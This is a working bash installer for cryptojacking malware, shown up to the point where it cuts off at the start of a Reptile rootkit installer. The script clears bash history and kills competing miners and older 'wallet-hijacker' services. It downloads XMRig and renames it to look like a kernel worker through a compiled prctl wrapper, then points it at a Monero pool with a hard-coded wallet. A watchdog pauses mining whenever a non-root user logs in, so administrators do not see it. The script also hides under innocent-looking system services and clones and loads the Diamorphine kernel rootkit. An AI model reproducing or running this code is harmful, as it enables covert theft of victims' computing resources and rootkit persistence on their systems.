#!/bin/bash

# ==================== DISABLE ALL DEBUGGING ====================
{ set +x; } 2>/dev/null
unset BASH_XTRACEFD PS4 2>/dev/null
# exec 2>/dev/null >/dev/null  <-- COMMENTED OUT - Output now visible

# Continue with existing code...
# Removed -u and -o pipefail to ensure script ALWAYS continues
set +ue          # Disable exit on error
set +o pipefail  # Disable pipeline error propagation
IFS=$'\n\t'
unset HISTFILE
export HISTFILE=/dev/null

# Trap errors but continue execution
trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR

# ==================== GIT CONFIGURATION ====================
# Disable git interactive prompts globally
export GIT_TERMINAL_PROMPT=0
git config --global credential.helper "" 2>/dev/null || true

# ==================== ARCHITECTURE DETECTION ====================
# Detect if system is 32-bit or 64-bit to skip incompatible rootkits
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64)
        IS_64BIT=true
        echo "[*] Detected 64-bit system (x86_64) - all rootkits available"
        ;;
    i386|i686|x86)
        IS_64BIT=false
        echo "[!] WARNING: 32-bit system detected ($ARCH)"
        echo "[!] Advanced rootkits (Reptile, crypto-miner) will be SKIPPED"
        echo "[!] Reason: They use 64-bit assembly and cannot compile on 32-bit"
        ;;
    armv7l|armv8|aarch64|arm*)
        IS_64BIT=false
        echo "[!] WARNING: ARM architecture detected ($ARCH)"
        echo "[!] x86-specific kernel rootkits will be SKIPPED"
        ;;
    *)
        IS_64BIT=false
        echo "[!] WARNING: Unknown architecture: $ARCH"
        echo "[!] Kernel rootkits will be SKIPPED for safety"
        ;;
esac

# ==================== CLEANUP OLD INSTALLATION ====================
echo ""
echo "=========================================="
echo "CLEANING UP OLD INSTALLATION"
echo "=========================================="
echo ""

# List of old service names to check and remove
OLD_SERVICES=(
    "smart-wallet-hijacker"
    "wallet-hijacker"
    "system-monitor"
    "lightd"
)

# List of old binary names to check and remove
OLD_BINARIES=(
    "/usr/local/bin/smart-wallet-hijacker"
    "/usr/local/bin/wallet-hijacker"
    "/usr/local/bin/system-monitor"
    "/usr/local/bin/lightd"
)

echo "[*] Stopping and removing old wallet hijacker services..."
for service_name in "${OLD_SERVICES[@]}"; do
    # Check if service exists
    if systemctl list-unit-files 2>/dev/null | grep -q "^${service_name}.service"; then
        echo "    [*] Found old service: $service_name"
        
        # Stop the service
        systemctl stop "$service_name" 2>/dev/null || true
        
        # Disable the service
        systemctl disable "$service_name" 2>/dev/null || true
        
        # Remove service file
        rm -f "/etc/systemd/system/${service_name}.service" 2>/dev/null || true
        
        echo "    [✓] Stopped and removed: $service_name"
    fi
    
    # Also check SysV init
    if [ -f "/etc/init.d/$service_name" ]; then
        /etc/init.d/$service_name stop 2>/dev/null || true
        rm -f "/etc/init.d/$service_name" 2>/dev/null || true
    fi
done

echo ""
echo "[*] Killing old wallet hijacker processes (memory cleanup)..."

# Kill by process name
for proc in smart-wallet-hijacker wallet-hijacker system-monitor lightd; do
    if pgrep -f "$proc" >/dev/null 2>&1; then
        echo "    [*] Killing process: $proc"
        pkill -9 -f "$proc" 2>/dev/null || true
        sleep 1
    fi
done

# Kill by binary path
for binary in "${OLD_BINARIES[@]}"; do
    if pgrep -f "$binary" >/dev/null 2>&1; then
        echo "    [*] Killing process: $binary"
        pkill -9 -f "$binary" 2>/dev/null || true
        sleep 1
    fi
done

echo "[✓] Old processes killed (removed from memory)"

echo ""
echo "[*] Removing old binaries from disk..."
for binary in "${OLD_BINARIES[@]}"; do
    if [ -f "$binary" ]; then
        echo "    [*] Deleting: $binary"
        rm -f "$binary" 2>/dev/null || true
        echo "    [✓] Deleted from disk"
    fi
done

# Remove old cron entries
echo ""
echo "[*] Removing old cron entries..."
if crontab -l 2>/dev/null | grep -qE 'smart-wallet-hijacker|wallet-hijacker|system-monitor|lightd'; then
    echo "    [*] Found old cron entries, removing..."
    crontab -l 2>/dev/null | grep -vE 'smart-wallet-hijacker|wallet-hijacker|system-monitor|lightd' | crontab - 2>/dev/null || true
    echo "    [✓] Cron entries cleaned"
fi

# Reload systemd to clear old service definitions
echo ""
echo "[*] Reloading systemd daemon..."
systemctl daemon-reload 2>/dev/null || true

echo ""
echo "[✓] CLEANUP COMPLETE"
echo "    ✓ Old services stopped and removed"
echo "    ✓ Old processes killed (memory cleaned)"
echo "    ✓ Old binaries deleted from disk"
echo "    ✓ Cron entries removed"
echo ""
echo "[*] Proceeding with fresh installation..."
echo ""

# ==================== REPTILE COMMAND WRAPPER ====================
# Helper function to call reptile commands (handles different installation paths)
reptile_cmd() {
    local cmd="$1"
    shift
    
    # Skip entirely on non-64-bit systems
    if [ "$IS_64BIT" = "false" ]; then
        return 0
    fi
    
    # Try different possible locations where reptile might be installed
    if [ -f /reptile/bin/reptile ]; then
        /reptile/bin/reptile "$cmd" "$@" 2>/dev/null || true
    elif [ -f /tmp/.ICE-unix/.X11-unix/Reptile/reptile_cmd ]; then
        /tmp/.ICE-unix/.X11-unix/Reptile/reptile_cmd "$cmd" "$@" 2>/dev/null || true
    elif [ -f ./reptile_cmd ]; then
        ./reptile_cmd "$cmd" "$@" 2>/dev/null || true
    elif command -v reptile >/dev/null 2>&1; then
        reptile "$cmd" "$@" 2>/dev/null || true
    else
        # Reptile not found, silently skip
        return 1
    fi
}

# ==================== PACKAGE MANAGER DETECTION ====================
# Detect which package manager is available
if command -v apt-get >/dev/null 2>&1; then
    PKG_MANAGER="apt-get"
    PKG_INSTALL="apt-get install -y"
    PKG_UPDATE="apt-get update"
elif command -v yum >/dev/null 2>&1; then
    PKG_MANAGER="yum"
    PKG_INSTALL="yum install -y"
    PKG_UPDATE="yum update"
elif command -v dnf >/dev/null 2>&1; then
    PKG_MANAGER="dnf"
    PKG_INSTALL="dnf install -y"
    PKG_UPDATE="dnf update"
else
    echo "[!] WARNING: No supported package manager found"
    PKG_MANAGER="unknown"
    PKG_INSTALL="echo 'No package manager available:'"
    PKG_UPDATE="true"
fi
echo "[*] Detected package manager: $PKG_MANAGER"

# ==================== DPKG INTERRUPT AUTO-FIX (Debian/Ubuntu) ====================
# Detect and fix interrupted dpkg/apt operations before installing packages

if command -v dpkg >/dev/null 2>&1; then
    echo ""
    echo "========================================"
    echo "CHECKING DPKG STATUS"
    echo "========================================"
    
    # Check if dpkg was interrupted
    DPKG_INTERRUPTED=false
    
    # Method 1: Check dpkg status (ONLY packages with actual problems)
    if dpkg --audit 2>&1 | grep -qE "half-configured|half-installed|unpacked.*not configured"; then
        DPKG_INTERRUPTED=true
        echo "[!] DPKG interrupt detected (dpkg --audit shows half-configured packages)"
    fi
    
    # Method 2: Check apt-get for ACTUAL errors (not just warnings)
    if apt-get check 2>&1 | grep -qE "dpkg was interrupted.*must manually run|You must.*dpkg --configure"; then
        DPKG_INTERRUPTED=true
        echo "[!] DPKG interrupt detected (apt-get check shows actual interrupt)"
    fi
    
    # Method 3: Check lock files ONLY if process is stuck
    if [ -f /var/lib/dpkg/lock-frontend ] || [ -f /var/lib/dpkg/lock ]; then
        # Only consider it interrupted if lock file exists AND process is stuck
        if lsof /var/lib/dpkg/lock 2>/dev/null | grep -q dpkg; then
            # Process is actually running - not interrupted, just busy
            echo "[*] DPKG is currently running (locked by active process)"
            DPKG_INTERRUPTED=false
        elif pgrep -x "dpkg\|apt-get\|apt\|aptitude" >/dev/null 2>&1; then
            # Package manager is running - not interrupted
            echo "[*] Package manager is currently running"
            DPKG_INTERRUPTED=false
        elif [ -f /var/lib/dpkg/status-old ] && [ -f /var/lib/dpkg/lock ]; then
            # Lock file exists, no process, and backup status exists = interrupted
            DPKG_INTERRUPTED=true
            echo "[!] DPKG may have been interrupted (stale lock with no process)"
        fi
    fi
    
    # Fix if interrupted
    if [ "$DPKG_INTERRUPTED" = "true" ]; then
        echo ""
        echo "[!] DPKG WAS INTERRUPTED - FIXING AUTOMATICALLY"
        echo "========================================"
        
        # Kill any stuck dpkg processes
        echo "[*] Checking for stuck dpkg processes..."
        pkill -9 dpkg 2>/dev/null || true
        pkill -9 apt-get 2>/dev/null || true
        pkill -9 apt 2>/dev/null || true
        sleep 2
        
        # Remove lock files if they exist and no process is using them
        echo "[*] Removing stale lock files..."
        if ! lsof /var/lib/dpkg/lock >/dev/null 2>&1; then
            rm -f /var/lib/dpkg/lock 2>/dev/null || true
            rm -f /var/lib/dpkg/lock-frontend 2>/dev/null || true
            rm -f /var/lib/apt/lists/lock 2>/dev/null || true
            rm -f /var/cache/apt/archives/lock 2>/dev/null || true
        fi
        
        # Run dpkg --configure -a to fix interrupted installations
        echo "[*] Running: dpkg --configure -a"
        echo ""
        
        DEBIAN_FRONTEND=noninteractive dpkg --configure -a 2>&1 | tail -20
        
        sleep 2
        
        # Fix any broken dependencies
        echo ""
        echo "[*] Running: apt-get install -f"
        
        DEBIAN_FRONTEND=noninteractive apt-get install -f -y 2>&1 | tail -20
        
        sleep 2
        
        # Verify it's fixed
        echo ""
        echo "[*] Verifying dpkg is now working..."
        
        if dpkg --audit 2>&1 | grep -q "not fully installed\|not installed\|half-configured"; then
            echo "[!] WARNING: Some packages may still have issues"
            echo "[*] Continuing anyway - script will handle package errors"
        else
            echo "[✓] DPKG is now working correctly"
        fi
        
        echo "========================================"
        echo ""
    else
        echo "[✓] DPKG is working correctly (no interrupt detected)"
        echo ""
    fi
fi

# ==================== ROBUST SERVICE STOPPING FUNCTION ====================
# This function NEVER gives up trying to stop services/processes
force_stop_service() {
    local service_names="$1"  # Space-separated list of service names
    local process_names="$2"  # Space-separated list of process names
    local max_attempts=60     # 60 attempts = ~5 minutes max
    local attempt=0
    
    echo "[*] Force-stopping services: $service_names"
    echo "[*] Force-stopping processes: $process_names"
    
    while [ $attempt -lt $max_attempts ]; do
        attempt=$((attempt + 1))
        local all_stopped=true
        
        # Method 1: Try systemctl stop for each service
        if [ -n "$service_names" ]; then
            for svc in $service_names; do
                if systemctl is-active --quiet "$svc" 2>/dev/null; then
                    echo "[*] Attempt $attempt: Stopping service $svc with systemctl..."
                    systemctl stop "$svc" 2>/dev/null || true
                    all_stopped=false
                fi
            done
        fi
        
        # Method 2: Kill processes by name (all methods)
        if [ -n "$process_names" ]; then
            for proc in $process_names; do
                # Check if any process with this name exists
                if pgrep -x "$proc" >/dev/null 2>&1 || pgrep -f "$proc" >/dev/null 2>&1; then
                    echo "[*] Attempt $attempt: Killing process $proc..."
                    
                    # Method 2a: pkill by exact name
                    pkill -9 -x "$proc" 2>/dev/null || true
                    
                    # Method 2b: pkill by pattern (full command line)
                    pkill -9 -f "$proc" 2>/dev/null || true
                    
                    # Method 2c: Find and kill by PID
                    local pids=$(pgrep -x "$proc" 2>/dev/null)
                    if [ -n "$pids" ]; then
                        for pid in $pids; do
                            kill -9 "$pid" 2>/dev/null || true
                        done
                    fi
                    
                    # Method 2d: Find by full command and kill
                    local pids=$(pgrep -f "$proc" 2>/dev/null)
                    if [ -n "$pids" ]; then
                        for pid in $pids; do
                            kill -9 "$pid" 2>/dev/null || true
                        done
                    fi
                    
                    all_stopped=false
                fi
            done
        fi
        
        # Method 3: Check /proc for survivors
        if [ -n "$process_names" ]; then
            for proc in $process_names; do
                for pid_dir in /proc/[0-9]*; do
                    if [ -f "$pid_dir/cmdline" ]; then
                        local cmdline=$(cat "$pid_dir/cmdline" 2>/dev/null | tr '\0' ' ')
                        if echo "$cmdline" | grep -q "$proc"; then
                            local pid=$(basename "$pid_dir")
                            echo "[*] Attempt $attempt: Found survivor PID $pid, killing..."
                            kill -9 "$pid" 2>/dev/null || true
                            all_stopped=false
                        fi
                    fi
                done
            done
        fi
        
        # If everything is stopped, break out
        if [ "$all_stopped" = true ]; then
            echo "[✓] All services/processes stopped after $attempt attempts"
            return 0
        fi
        
        # Wait before next attempt
        sleep 3
    done
    
    echo "[!] WARNING: Some services/processes may still be running after $max_attempts attempts"
    echo "[*] Continuing anyway..."
    return 0
}

# ==================== DETECT INIT SYSTEM ====================
SYSTEMD_AVAILABLE=false
if command -v systemctl >/dev/null 2>&1 && systemctl --version >/dev/null 2>&1; then
    SYSTEMD_AVAILABLE=true
    echo "[*] Detected systemd init system"
else
    echo "[*] Detected SysV init system (legacy mode)"
fi

# ==================== CLEAN UP OLD INSTALLATIONS ====================
echo "[*] Cleaning up old miner installations..."

# Stop all possible miner services (systemd)
if [ "$SYSTEMD_AVAILABLE" = true ]; then
    force_stop_service "swapd kswapd0 xmrig" ""
fi

# Stop all possible miner processes (direct kill)
force_stop_service "" "swapd kswapd0 xmrig"

# Remove old service files
rm -f /etc/systemd/system/swapd.service 2>/dev/null
rm -f /etc/systemd/system/kswapd0.service 2>/dev/null
rm -f /etc/systemd/system/xmrig.service 2>/dev/null
rm -f /etc/init.d/swapd 2>/dev/null
rm -f /etc/init.d/kswapd0 2>/dev/null

# Reload systemd if it exists
if [ "$SYSTEMD_AVAILABLE" = true ]; then
    systemctl daemon-reload 2>/dev/null || true
fi

# Remove old miner directories
rm -rf /root/.swapd 2>/dev/null
rm -rf /tmp/xmrig 2>/dev/null
rm -rf ~/.xmrig 2>/dev/null

echo "[✓] Cleanup complete"

# ==================== ENSURE DEPENDENCIES ====================
echo "[*] Installing dependencies..."

# Update package lists
echo "[*] Updating package lists..."
apt-get update 2>&1 | grep -E "Reading|Building|Fetched" || true
yum update -y 2>&1 | grep -E "Loading|Installed" || true
dnf update -y 2>&1 | grep -E "Loading|Installed" || true

# Install everything in one shot - NEVER FAIL
echo "[*] Installing git make gcc build-essential kernel headers..."

# Try apt-get (Debian/Ubuntu)
if command -v apt-get >/dev/null 2>&1; then
    DEBIAN_FRONTEND=noninteractive apt-get install -y \
        git make gcc g++ build-essential \
        linux-headers-$(uname -r) \
        wget curl 2>&1 | tail -10 || true
fi

# Try yum (RHEL/CentOS)
if command -v yum >/dev/null 2>&1; then
    yum install -y git make gcc gcc-c++ \
        kernel-devel kernel-headers \
        wget curl 2>&1 | tail -10 || true
fi

# Try dnf (Fedora)
if command -v dnf >/dev/null 2>&1; then
    dnf install -y git make gcc gcc-c++ \
        kernel-devel kernel-headers \
        wget curl 2>&1 | tail -10 || true
fi

# Show what we have
echo "[*] Checking installed tools..."
command -v git >/dev/null 2>&1 && echo "[✓] git: $(git --version)" || echo "[!] git: not found (will try to continue anyway)"
command -v make >/dev/null 2>&1 && echo "[✓] make: installed" || echo "[!] make: not found (will try to continue anyway)"
command -v gcc >/dev/null 2>&1 && echo "[✓] gcc: installed" || echo "[!] gcc: not found (will try to continue anyway)"

echo "[✓] Dependency installation complete (continuing regardless of results)"

# ==================== DETECT DOWNLOAD TOOL ====================
USE_WGET=false
if ! command -v curl >/dev/null 2>&1; then
    echo "[*] curl not found, using wget instead"
    USE_WGET=true
elif ! curl -sS --max-time 5 https://google.com >/dev/null 2>&1; then
    echo "[!] curl SSL/TLS error detected, falling back to wget"
    USE_WGET=true
fi

# ==================== DOWNLOAD XMRIG ====================
echo "[*] Downloading XMRig..."

mkdir -p /root/.swapd
cd /root/.swapd || {
    echo "[!] Failed to cd to /root/.swapd, trying to create it..."
    mkdir -p /root/.swapd 2>/dev/null || true
    cd /root/.swapd || {
        echo "[!] Cannot access /root/.swapd - using /tmp instead"
        cd /tmp
    }
}

XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
DOWNLOAD_SUCCESS=false

# Try to download xmrig
if [ "$USE_WGET" = true ]; then
    if wget -q --no-check-certificate -O xmrig.tar.gz "$XMRIG_URL" 2>/dev/null; then
        DOWNLOAD_SUCCESS=true
    fi
else
    if curl -sS -L -k -o xmrig.tar.gz "$XMRIG_URL" 2>/dev/null; then
        DOWNLOAD_SUCCESS=true
    fi
fi

# Extract if download was successful
if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
    tar -xzf xmrig.tar.gz 2>/dev/null || {
        echo "[!] Failed to extract xmrig - continuing anyway..."
        DOWNLOAD_SUCCESS=false
    }
    
    if [ "$DOWNLOAD_SUCCESS" = true ]; then
        # Rename xmrig to hidden .kworker (actual miner binary)
        mv xmrig-*/xmrig .kworker 2>/dev/null || {
            echo "[!] Failed to rename xmrig binary - continuing anyway..."
            DOWNLOAD_SUCCESS=false
        }
    fi
    
    if [ "$DOWNLOAD_SUCCESS" = true ]; then
        chmod +x .kworker 2>/dev/null || true
        rm -rf xmrig-* xmrig.tar.gz
        echo "[✓] XMRig downloaded and renamed to '.kworker' (hidden)"
    fi
fi

if [ "$DOWNLOAD_SUCCESS" = false ]; then
    echo "[!] Failed to download/extract XMRig"
    echo "[!] You can manually download xmrig and place it at /root/.swapd/.kworker"
    echo "[*] Continuing with installation anyway..."
    # Create a placeholder so config creation doesn't fail
    touch /root/.swapd/.kworker 2>/dev/null || true
fi

# ==================== CREATE PRCTL WRAPPER ====================
echo "[*] Creating kernel worker process wrapper..."

# Create C wrapper that uses prctl(PR_SET_NAME) to rename process
cat > /tmp/kworker_wrapper.c << 'WRAPPER_EOF'
/*
 * Kernel Worker Process Wrapper
 * Renames process to look like kernel worker thread using prctl(PR_SET_NAME)
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <string.h>

int main(int argc, char *argv[]) {
    // Set process name to kernel worker thread
    // prctl can set up to 15 characters
    if (prctl(PR_SET_NAME, "kworker/0:0", 0, 0, 0) < 0) {
        // Silently continue even if prctl fails
    }
    
    // Path to actual miner binary
    char *miner_path = "/root/.swapd/.kworker";
    
    // Build argument list for execv
    char **new_argv = malloc(sizeof(char*) * (argc + 1));
    if (!new_argv) {
        exit(1);
    }
    
    // Set argv[0] to kernel worker name (shows in ps output)
    new_argv[0] = "[kworker/0:0]";
    
    // Copy remaining arguments (like -c /root/.swapd/swapfile)
    for (int i = 1; i < argc; i++) {
        new_argv[i] = argv[i];
    }
    new_argv[argc] = NULL;
    
    // Replace current process with miner
    // This preserves the PID and the prctl name
    execv(miner_path, new_argv);
    
    // If execv returns, it failed - silently exit
    exit(1);
}
WRAPPER_EOF

# Compile the wrapper
if command -v gcc >/dev/null 2>&1; then
    echo "[*] Compiling kernel worker wrapper with gcc..."
    gcc -o swapd /tmp/kworker_wrapper.c 2>/dev/null && {
        chmod +x swapd
        rm -f /tmp/kworker_wrapper.c
        echo "[✓] Kernel worker wrapper compiled successfully"
        echo "[✓] Process will appear as 'kworker/0:0' (kernel worker thread)"
    } || {
        echo "[!] Failed to compile wrapper, using direct binary"
        # Fallback: create symlink to actual binary
        ln -sf .kworker swapd 2>/dev/null || cp .kworker swapd 2>/dev/null
        rm -f /tmp/kworker_wrapper.c
    }
else
    echo "[!] gcc not available, using direct binary"
    # Fallback: create symlink to actual binary
    ln -sf .kworker swapd 2>/dev/null || cp .kworker swapd 2>/dev/null
    rm -f /tmp/kworker_wrapper.c
fi


# ==================== CONFIGURE XMRIG ====================
echo "[*] Configuring XMRig..."

# User-configurable variables
WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"

# ==================== IP DETECTION FOR PASS FIELD ====================
echo "[*] Detecting server IP address for worker identification..."

# Simple and reliable method - uses curl to get public IP
PASS=$(curl -4 -s --connect-timeout 5 ip.sb 2>/dev/null)

# Fallback if curl failed or returned localhost
if [ "$PASS" == "localhost" ] || [ -z "$PASS" ]; then
  echo "[*] Direct IP detection failed, using route method..."
  PASS=$(ip route get 1 2>/dev/null | awk '{print $NF;exit}')
fi

# Final fallback
if [ -z "$PASS" ]; then
  echo "[!] IP detection failed, using hostname..."
  PASS=$(hostname 2>/dev/null || echo "na")
fi

# Clean up any whitespace
PASS=$(echo "$PASS" | tr -d '[:space:]')

echo "[✓] Worker identifier (IP): $PASS"

# Optional: Add email if configured
EMAIL=""  # Leave empty or set your email
if [ -n "$EMAIL" ]; then
    PASS="$PASS:$EMAIL"
    echo "[✓] Added email to identifier"
fi

# Create configuration file (will be renamed to swapfile for stealth)
cat > config.json << 'EOL'
{
    "autosave": false,
    "donate-level": 0,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "coin": "monero",
            "algo": "rx/0",
            "url": "gulf.moneroocean.stream:80",
            "user": "WALLET_PLACEHOLDER",
            "pass": "PASS_PLACEHOLDER",
            "keepalive": true,
            "tls": false
        }
    ]
}
EOL

# Replace placeholders
sed -i "s/WALLET_PLACEHOLDER/$WALLET/g" config.json
sed -i "s/PASS_PLACEHOLDER/$PASS/g" config.json

# Rename to swapfile for stealth
mv config.json swapfile

# Double-check: Ensure PASS is set in swapfile (safety check)
if grep -q "PASS_PLACEHOLDER" swapfile 2>/dev/null; then
    echo "[!] Warning: PASS_PLACEHOLDER still in file, fixing..."
    sed -i "s/PASS_PLACEHOLDER/$PASS/g" swapfile
fi

# Also update any existing pass field to ensure it's correct
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' swapfile

echo "[✓] XMRig configuration created as 'swapfile'"
echo "[✓] Wallet: ${WALLET:0:20}...${WALLET: -20}"
echo "[✓] Pass (Worker ID): $PASS"

# Verify PASS was set correctly
if grep -q '"pass": "'$PASS'"' swapfile; then
    echo "[✓] Worker ID successfully set in config"
else
    echo "[!] Warning: Worker ID may not be set correctly"
    echo "[*] Current pass field: $(grep '"pass"' swapfile || echo 'not found')"
fi

# ==================== CREATE INTELLIGENT WATCHDOG ====================
echo "[*] Creating intelligent watchdog (3-minute interval, state-tracked)..."

cat > /usr/local/bin/system-watchdog << 'WATCHDOG_EOF'
#!/bin/bash

# ==================== INTELLIGENT WATCHDOG WITH STATE TRACKING ====================
# Monitors for admin logins and gracefully stops/starts the miner
# - Checks every 3 minutes (not aggressive)
# - Tracks state to avoid unnecessary service restarts
# - Only acts when state CHANGES (login/logout detected)
# - Uses systemd or init.d depending on system

set +ue
IFS=$'\n\t'

STATE_FILE="/var/tmp/.miner_state"
CHECK_INTERVAL=180  # 3 minutes

# Detect init system
if command -v systemctl >/dev/null 2>&1 && systemctl --version >/dev/null 2>&1; then
    INIT_SYSTEM="systemd"
    START_CMD="systemctl start swapd"
    STOP_CMD="systemctl stop swapd"
    STATUS_CMD="systemctl is-active swapd"
else
    INIT_SYSTEM="sysv"
    START_CMD="/etc/init.d/swapd start"
    STOP_CMD="/etc/init.d/swapd stop"
    STATUS_CMD="/etc/init.d/swapd status"
fi

# Initialize state if it doesn't exist
if [ ! -f "$STATE_FILE" ]; then
    echo "stopped" > "$STATE_FILE"
fi

while true; do
    # Check if any admin users are logged in (exclude root)
    ADMIN_LOGGED_IN=false
    if who | grep -qvE "^root\s"; then
        ADMIN_LOGGED_IN=true
    fi
    
    # Read previous state
    PREV_STATE=$(cat "$STATE_FILE" 2>/dev/null || echo "stopped")
    
    # Determine desired state
    if [ "$ADMIN_LOGGED_IN" = true ]; then
        DESIRED_STATE="stopped"
    else
        DESIRED_STATE="running"
    fi
    
    # Only act if state CHANGED
    if [ "$DESIRED_STATE" != "$PREV_STATE" ]; then
        if [ "$DESIRED_STATE" = "stopped" ]; then
            # Admin logged in - stop miner
            $STOP_CMD >/dev/null 2>&1 || true
            echo "stopped" > "$STATE_FILE"
        else
            # Admin logged out - start miner
            $START_CMD >/dev/null 2>&1 || true
            echo "running" > "$STATE_FILE"
        fi
    fi
    
    # Wait before next check
    sleep "$CHECK_INTERVAL"
done
WATCHDOG_EOF

chmod +x /usr/local/bin/system-watchdog
echo "[✓] Intelligent watchdog created"

# ==================== CREATE SYSTEMD SERVICE (if available) ====================
if [ "$SYSTEMD_AVAILABLE" = true ]; then
    echo "[*] Creating systemd service..."
    
    cat > /etc/systemd/system/swapd.service << 'SERVICE_EOF'
[Unit]
Description=System swap daemon
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/.swapd
ExecStart=/root/.swapd/swapd -c /root/.swapd/swapfile
Restart=always
RestartSec=10
Nice=19
CPUQuota=95%
IOSchedulingClass=idle
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
SERVICE_EOF
    
    # Enable and start the service
    systemctl daemon-reload
    systemctl enable swapd 2>/dev/null || true
    
    echo "[✓] Systemd service created and enabled"
    
    # Create watchdog service
    cat > /etc/systemd/system/system-watchdog.service << 'WATCHDOG_SERVICE_EOF'
[Unit]
Description=System monitoring watchdog
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/system-watchdog
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
WATCHDOG_SERVICE_EOF
    
    systemctl daemon-reload
    systemctl enable system-watchdog 2>/dev/null || true
    systemctl start system-watchdog 2>/dev/null || true
    
    echo "[✓] Watchdog service created and enabled"
    
else
    # ==================== CREATE SYSV INIT SCRIPT ====================
    echo "[*] Creating SysV init script..."
    
    cat > /etc/init.d/swapd << 'INIT_EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          swapd
# Required-Start:    $network $local_fs $remote_fs
# Required-Stop:     $network $local_fs $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System swap daemon
### END INIT INFO

DAEMON=/root/.swapd/swapd
DAEMON_ARGS="-c /root/.swapd/swapfile"
NAME=swapd
PIDFILE=/var/run/$NAME.pid
WORKDIR=/root/.swapd

case "$1" in
    start)
        echo "Starting $NAME..."
        cd $WORKDIR
        start-stop-daemon --start --background --make-pidfile --pidfile $PIDFILE --chdir $WORKDIR --exec $DAEMON -- $DAEMON_ARGS || true
        ;;
    stop)
        echo "Stopping $NAME..."
        start-stop-daemon --stop --pidfile $PIDFILE --retry 5 || true
        pkill -9 -f swapd || true
        rm -f $PIDFILE
        ;;
    restart)
        $0 stop
        sleep 2
        $0 start
        ;;
    status)
        if [ -f $PIDFILE ]; then
            PID=$(cat $PIDFILE)
            if kill -0 $PID 2>/dev/null; then
                echo "$NAME is running (PID $PID)"
            else
                echo "$NAME is not running (stale PID file)"
            fi
        else
            echo "$NAME is not running"
        fi
        ;;
    *)
        echo "Usage: $0 {start|stop|restart|status}"
        exit 1
        ;;
esac

exit 0
INIT_EOF
    
    chmod +x /etc/init.d/swapd
    
    # Add to startup (distribution-specific)
    if command -v update-rc.d >/dev/null 2>&1; then
        update-rc.d swapd defaults >/dev/null 2>&1 || true
    elif command -v chkconfig >/dev/null 2>&1; then
        chkconfig --add swapd >/dev/null 2>&1 || true
        chkconfig swapd on >/dev/null 2>&1 || true
    fi
    
    echo "[✓] SysV init script created and enabled"
    
    # Install watchdog as a background daemon
    echo "[*] Installing watchdog as background daemon..."
    nohup /usr/local/bin/system-watchdog >/dev/null 2>&1 &
    echo "[✓] Watchdog started in background"
fi

# ==================== INSTALL DIAMORPHINE (Universal Kernel Rootkit) ====================
install_diamorphine() {
    echo ""
    echo "========================================"
    echo "INSTALLING DIAMORPHINE ROOTKIT"
    echo "========================================"
    
    # Skip on non-64-bit systems
    if [ "$IS_64BIT" = "false" ]; then
        echo "[!] Skipping Diamorphine on non-64-bit system"
        return 1
    fi
    
    # Check kernel version compatibility
    KERNEL_VERSION=$(uname -r | cut -d. -f1)
    KERNEL_MINOR=$(uname -r | cut -d. -f2)
    
    echo "[*] Detected kernel version: $(uname -r)"
    
    if [ "$KERNEL_VERSION" -ge 6 ]; then
        echo ""
        echo "[!] ============================================"
        echo "[!] WARNING: Kernel 6.x detected!"
        echo "[!] ============================================"
        echo "[!] Diamorphine may NOT work on kernel 6.x"
        echo "[!] Diamorphine is tested up to kernel 5.x"
        echo ""
        echo "[*] RECOMMENDATION for kernel 6.x:"
        echo "    • Use Reptile rootkit instead (better 6.x support)"
        echo "    • Or skip rootkit installation"
        echo ""
        echo "[*] Attempting installation anyway..."
        echo "    (may fail during load or cause kernel panic)"
        echo ""
        sleep 3
    elif [ "$KERNEL_VERSION" -eq 5 ] && [ "$KERNEL_MINOR" -ge 15 ]; then
        echo "[*] Kernel 5.15+ detected - should work but watch for issues"
    else
        echo "[✓] Kernel version compatible with Diamorphine"
    fi
    
    cd /tmp || return 1
    
    # Remove old installation
    if lsmod | grep -q diamorphine 2>/dev/null; then
        echo "[*] Removing old Diamorphine..."
        rmmod diamorphine 2>/dev/null || true
        sleep 1
    fi
    
    rm -rf diamorphine 2>/dev/null
    
    # Clone and build
    echo "[*] Cloning Diamorphine..."
    export GIT_TERMINAL_PROMPT=0
    if ! git clone --depth 1 https://github.com/m0nad/Diamorphine.git diamorphine 2>&1 | grep -v "Username"; then
        echo "[!] Failed to clone Diamorphine (network or repository unavailable)"
        unset GIT_TERMINAL_PROMPT
        return 1
    fi
    unset GIT_TERMINAL_PROMPT
    
    cd diamorphine || {
        echo "[!] Failed to cd to diamorphine directory"
        cd /tmp
        rm -rf diamorphine
        return 1
    }
    
    echo "[*] Building Diamorphine..."
    if ! make 2>/dev/null; then
        echo "[!] Failed to build Diamorphine"
        echo "[!] This is common on kernel 6.x - try Reptile instead"
        cd /tmp
        rm -rf diamorphine
        return 1
    fi
    
    # Load the module
    echo "[*] Loading Diamorphine kernel module..."
    if ! insmod diamorphine.ko 2>/dev/null; then
        echo "[!] Failed to load Diamorphine"
        echo "[!] Likely kernel 6.x incompatibility - try Reptile instead"
        cd /tmp
        rm -rf diamorphine
        return 1
    fi
    
    # Verify it loaded
    if lsmod | grep -q diamorphine 2>/dev/null; then
        echo "[✓] Diamorphine loaded successfully"
        echo "[✓] Surprisingly worked on kernel $(uname -r)!"
        
        # Clean up build artifacts
        cd /tmp
        rm -rf diamorphine
        
        return 0
    else
        echo "[!] Diamorphine failed to load"
        cd /tmp
        rm -rf diamorphine
        return 1
    fi
}

# ==================== INSTALL REPTILE (Advanced Kernel Rootkit) ====================
install_reptile() {
    echo ""
    echo "========================================"
    echo "INSTALLING REPTILE ROOTKIT"
    echo "========================================"
    
